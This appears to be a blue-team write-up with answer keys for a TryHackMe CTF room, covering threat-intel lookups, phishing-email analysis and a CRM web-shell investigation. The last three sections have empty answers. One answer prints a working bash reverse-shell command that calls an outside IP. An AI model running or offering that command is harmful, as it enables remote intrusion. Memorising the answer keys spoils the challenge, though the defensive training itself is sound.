![First Shift CTF Banner](https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/678ecc92c80aa206339f0f23-1765566600342)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Cover.png" alt="First Shift CTF Logo">
</p>

# <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/678ecc92c80aa206339f0f23-1765566441707" alt="image" style="vertical-align: middle;height: 50px;" /> First Shift CTF

This guide contains the answer and steps necessary to get to them for the [First Shift CTF](https://tryhackme.com/room/first-shift-ctf) room.

## Table of contents

- [Meet ProbablyFine](#meet-probablyfine)
- [Probably Just Fine](#probably-just-fine)
- [Phishing Books](#phishing-books)
- [Portal Drop](#portal-drop)
- [Zero Tolerance](#zero-tolerance)
- [The Crown Jewel](#the-crown-jewel)
- [Promotion Night](#promotion-night)

### Meet ProbablyFine

1.  Let's go! Your flag is: THM{first_shift_check_in!}



    ><details><summary>Click for answer</summary>THM{first_shift_check_in!}</details>

### Probably Just Fine

1.  What is the ASN number related to the IP?



    ><details><summary>Click for answer</summary>212238</details>

2.  Which service is offered from this IP?



    ><details><summary>Click for answer</summary>vpn</details>

3.  What is the filename of the file related to the hash?



    ><details><summary>Click for answer</summary>zY9sqWs.exe</details>

4.  What is the threat signature that Microsoft assigned to the file?



    ><details><summary>Click for answer</summary>Trojan:Win32/LummaStealer.PM!MTB</details>

5.  One of the contacted domains is part of a large malicious infrastructure cluster. Based on its HTTPS certificate, how many domains are linked to the same campaign?



    ><details><summary>Click for answer</summary>151</details>

6.  The file matches one of the YARA rules made by "kevoreilly". What line is present in the rule's "condition" field?



    ><details><summary>Click for answer</summary>uint16(0) == 0x5a4d and any of them</details>

7.  The file is also mentioned in one of the TI reports. What is the title of the report mentioning this hash?



    ><details><summary>Click for answer</summary>Behind the Curtain: How Lumma Affiliates Operate</details>

8.  Which team did the author of the malware start collaborating with in early 2024?



    ><details><summary>Click for answer</summary>GhostSocks</details>

9.  A Mexican-based affiliate related to the malware family also uses other infostealers. Which mentioned infostealer targets Android systems?



    ><details><summary>Click for answer</summary>CraxsRAT</details>

10.  The report states that the affiliates behind the malware use the services of AnonRDP. Which MITRE ATT&CK sub-technique does this align with?



     ><details><summary>Click for answer</summary>T1583.003</details>

### Phishing Books

1.  Which specific check within the headers explains the bypass of email filters? Answer Example: "CHECK=value"

    After opening the email analysis report, we can see which headers are not active in the "arc-authentication-results" section.

    ![Phishing Header](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Header.png)

    ><details><summary>Click for answer</summary>DMARC=none</details>

2.  What technique did the attacker use to make the message seem legitimate?

    If we look at the sender of the email, we can see that it closely resembles the legitimate domain. However, it replaces one or a few characters with another character while still having it look visually similar to the original.

    ![Phishing Typo](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Typo.png)
    
    ><details><summary>Click for answer</summary>Typosquatting</details>

3.  Which MITRE technique and sub-technique ID best fit this sender address trick?

    If we look for any mentioning of typosquatting in the MITRE framework, we find the technique "Acquire Infrastructure: Domains". One of these sub-techniques are relevant to the used technique.

    ><details><summary>Click for answer</summary>T1583.001</details>

4.  What is the file extension of the attached file?

    If we open the email in the mail client, we can see the attached file.

    ![Phishing Extension](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Extension.png)

    ><details><summary>Click for answer</summary>.HTML</details>

5.  What is the MD5 hash of the .HTML file?

    This we can find by downloading the attachment and running `md5sum library-invoice.pdf.html`.

    ![Phishing Md5](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Md5.png)

    ><details><summary>Click for answer</summary>442f2965cb6e9147da7908bb4eb73a72</details>

6.  What is the landing page of the phishing attack?

    Since it is an html file, we can open it in a browser. Here we see the landing page.

    ![Phishing Landing](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Landing.png)

    ><details><summary>Click for answer</summary>http://lib-service.com:8083</details>

7.  Which MITRE technique ID was used inside the attached file?

    When opening the attachment, we can see some kind of obfuscation is used. Looking for techniques related to this under "Defense Evasion" yields us the answer.

    ![Phishing Obfuscation](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Obfuscation.png)

    ><details><summary>Click for answer</summary>T1027</details>

8.  What is the hidden message the attacker left in the file?

    We can back track the javascript commands used to compile the message. First it joins the entire array, then it splits the characters, reverses them and joins them again. 

    ![Phishing Message](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Message.png)

    ><details><summary>Click for answer</summary>I love to phish books from libraries ^^</details>

9.  Which line in the attached file is responsible for decoding the URL redirect?

    This is the line that uses the "xanthium".

    ![Phishing Decoding](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Decoding.png)

    ><details><summary>Click for answer</summary>var src = reversed.split("").reverse().join("");</details>

10.  What is the first URL in the redirect chain?

     The decoded url redirects us to different urls. To find the first one, we can navigate to the url in firefox and enable persistant logs in the network tab.

     The first entry we see is the first url in the redirect chain.

     ![Phishing Redirect](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Redirect.png)

     ><details><summary>Click for answer</summary>http://xn--librarytlu-13cwe32432-kwr.com:8082</details>

11.  What is the Threat Actor associated with this malicious file and/or URL?

     We can lookup the landing page url in "trydetectme". Be sure to remove the port number and the protocol (lib-service.com).

     ![Phishing Adversary](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Phishing_Adversary.png)
 
     ><details><summary>Click for answer</summary>Cobalt Dickens | Silent Librarian</details>

12.  What is the main target of this Threat Actor according to MITRE?

     We can look for this adversarey on the [MITRE](https://attack.mitre.org) website to find their ptrimary target.

     ><details><summary>Click for answer</summary>research and proprietary data</details>

### Portal Drop

1.  What is the IP address that initiated the brute force on the CRM web portal?

    If we open the log file, we can filter on status code '401'. This might indicate a brute force login attempt. From the list, we can see which IP address initiated this attack.

    ![Portal Ip](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Ip.png)

    ><details><summary>Click for answer</summary>34.67.91.83</details>

2.  How many successful and failed logins are seen in the logs? Answer Example: 42, 56

    For this answer, we should filter the logs on the login page. Then we can look at the count of hits returning a status code of 200 and 401 respectively.

    ![Portal Login](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Login.png)

    ><details><summary>Click for answer</summary>18, 35</details>

3.  Following the brute force, which user-agent was used for the file upload?

    Lets filter the logs on the IP address we found earlier. Then we filter it on any request containing 'upload'. This gives us a short list with our user-agent.

    ![Portal Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Upload.png)

    ><details><summary>Click for answer</summary>python-requests/2.31.0</details>

4.  What was the name of the suspicious file uploaded by the attacker?

    In the previous image, we can see which file was uploaded by the attacker.

    ><details><summary>Click for answer</summary>invoice.php</details>

5.  At what time did the attacker first invoke the uploaded script? Answer Example: 2025-10-24 15:35:50

    From the list we see, the second one actually invokes the script on the server.

    ><details><summary>Click for answer</summary>2025-11-06 14:27:34</details>

6.  What is the first decoded command the attacker ran on the CRM?



    ![Portal Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Command.png)

    ><details><summary>Click for answer</summary>whoami</details>

7.  Based on the attacker’s activity on the CRM, which MITRE ATT&CK Persistence sub-technique ID is most applicable?

    If we look at the recent detections on the [EDR](https://static-labs.tryhackme.cloud/apps/portal-drop-edr/) website, we can see multiple entries. We are looking for something related to persistence. Hence we take an interest in the first entry (file write: backdoor).

    Opening this entry we can see which tactic and technique this is related to. We can look this up on the MITRE website to get the number associated with it.

    ![Portal Technique](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Technique.png)

    ><details><summary>Click for answer</summary>T1505.003</details>

8.  Which process image executes attacker commands received from the web?

    If we look at the second detection entry (shell spawn), we can see several commands that have been executed by the attacker on the machine. If we look at the initiating process, the details pane gives us the image.

    ![Portal Image](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Image.png)

    ><details><summary>Click for answer</summary>/usr/sbin/php-fpm7.4</details>

9.  What command allowed the attacker to open a bash reverse shell?

    In the same entry, we can see another command that is executed, which effectively spawns a reverse shell on the machine. 

    ![Portal Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Shell.png)

    ><details><summary>Click for answer</summary>bash -i >& /dev/tcp/115.58.148.86/8080 0>&1</details>

10.  Which Linux user executes the entered malicious commands?

     From the image above, we can also make out the user that issued the command.

     ><details><summary>Click for answer</summary>www-data</details>

11.  What sensitive CRM configuration file did the attacker access? 

     If we look at the next detection entry, we can see this is related to discovery. Indicating the attacker was snooping around. Here we can indeed see they were looking around for configuration files.

     ![Portal Find](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Find.png)

     They found one of the sensitive configuration files and tried to read it.

     ![Portal Cat](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Cat.png)

     ><details><summary>Click for answer</summary>/etc/trycrm/config.json</details>

12.  Which domain was used to exfiltrate the CRM portal database?

     The last command issued in this entry is a curl command. Usefull when extracting information. In this command we can see which domain the attacker is sending the data to.

     ![Portal Curl](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Curl.png)

     ><details><summary>Click for answer</summary>portaldrop2025.xyz</details>

13.  What flag do you get after completing all 12 EDR response actions?

     For the first entry we want to analyze the root cause and stop the malicious file quarantining it.

     For the second entry we must first terminate the connection from the bash command. Then we should also block the ip it is connected to.
    
     For the thirds entry we should isolate the host so the DFIR team can analyse the data. We must also block the related ip address. Then we should also analyse the root cause.

     For the fourth and final entry we should contact the user related to the login, review the changes made the the nginx configuration, and close it as a false positive if the actions taken are approved.

     ![Portal Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/first-shift-ctf/First_Shift_CTF_Portal_Flag.png)

     ><details><summary>Click for answer</summary>THM{p0rtal_dropp3d?}</details>

### Zero Tolerance

1.  What is the hostname where the Initial Access occurred?



    ><details><summary>Click for answer</summary>JP-BROWN-WS</details>

2.  What MITRE subtechnique ID describes the initial code execution on the beachhead?



    ><details><summary>Click for answer</summary></details>

3.  What is the full path of the malicious file that led to Initial Access?



    ><details><summary>Click for answer</summary></details>

4.  What is the full path to the LOLBin abused by the attacker for Initial Access?



    ><details><summary>Click for answer</summary></details>

5.  What is the IP address of the attacker's Command & Control server?



    ><details><summary>Click for answer</summary></details>

6.  What is the full path of the process responsible for the C2 beaconing?



    ><details><summary>Click for answer</summary></details>

7.  What is the full path, modified for Persistence on the beachhead host?



    ><details><summary>Click for answer</summary></details>

8.  What tool and parameter did the threat actor use for credential dumping?



    ><details><summary>Click for answer</summary></details>

9.  The threat actor executed a command to evade defenses.  What security parameter did they attempt to change?



    ><details><summary>Click for answer</summary></details>

10.  The threat actor used a tool to execute remote commands on other machines.  What is the process ID (PID) that executed the remote command?



     ><details><summary>Click for answer</summary></details>

11.  At what time did the threat actor pivot from the beachhead to another system? Answer format: YYYY-MM-DD HH:MM:SS



     ><details><summary>Click for answer</summary></details>

12.  What is the full path of the PowerShell script used by the threat actor to collect data?



     ><details><summary>Click for answer</summary></details>

13.  What are the first 4 file extensions targeted by this script for exfiltration? Answer format: Chronological, comma-separated



     ><details><summary>Click for answer</summary></details>

14.  What is the full path to the staged file containing collected files?



     ><details><summary>Click for answer</summary></details>

### The Crown Jewel

1.  From which internal IP did the suspicious connection originate?



    ><details><summary>Click for answer</summary></details>

2.  What outbound connection was detected as a C2 channel? (Answer example: 1.2.3.4:9996)



    ><details><summary>Click for answer</summary></details>

3.  Which MAC address is impersonating the gateway 10.10.10.1?



    ><details><summary>Click for answer</summary></details>

4.  What is the non-standard User-Agent hitting the Jira instance?



    ><details><summary>Click for answer</summary></details>

5.  How many ARP spoofing attacks were observed in the PCAP?



    ><details><summary>Click for answer</summary></details>

6.  What's the payload containing the plaintext creds found in the POST request?



    ><details><summary>Click for answer</summary></details>

7.  What domain, owned by the attacker, was used for data exfiltration?



    ><details><summary>Click for answer</summary></details>

8.  After examining the logs, which protocol was used for data exfiltration?



    ><details><summary>Click for answer</summary></details>

### Promotion Night

1.  What was the network share path where ransomware was placed?



    ><details><summary>Click for answer</summary></details>

2.  What is the value ransomware created to persist on reboot?



    ><details><summary>Click for answer</summary></details>

3.  What was the most likely extension of the encrypted files?



    ><details><summary>Click for answer</summary></details>

4.  Which MITRE technique ID was used to deploy ransomware?



    ><details><summary>Click for answer</summary></details>

5.  What ports of SRV-ITFS did the adversary successfully scan?



    ><details><summary>Click for answer</summary></details>

6.  What is the full path to the malware that performed the Discovery?



    ><details><summary>Click for answer</summary></details>

7.  Which artifact did the adversary create to persist on the beachhead?



    ><details><summary>Click for answer</summary></details>

8.  What is the MD5 hash of the embedded initial shellcode?



    ><details><summary>Click for answer</summary></details>

9.  Which C2 framework was used by the adversary in the intrusion?



    ><details><summary>Click for answer</summary></details>

10.  What hostname did the adversary log in from on the beachhead?



     ><details><summary>Click for answer</summary></details>

11.  What was the UNC path that likely contained AWS credentials?



     ><details><summary>Click for answer</summary></details>

12.  From which IP address did the adversary access AWS?



     ><details><summary>Click for answer</summary></details>

13.  Which two sensitive files did the adversary exfiltrate from AWS?



     ><details><summary>Click for answer</summary></details>

14.  What file did the adversary upload to S3 in place of the wiped ones?



     ><details><summary>Click for answer</summary></details>

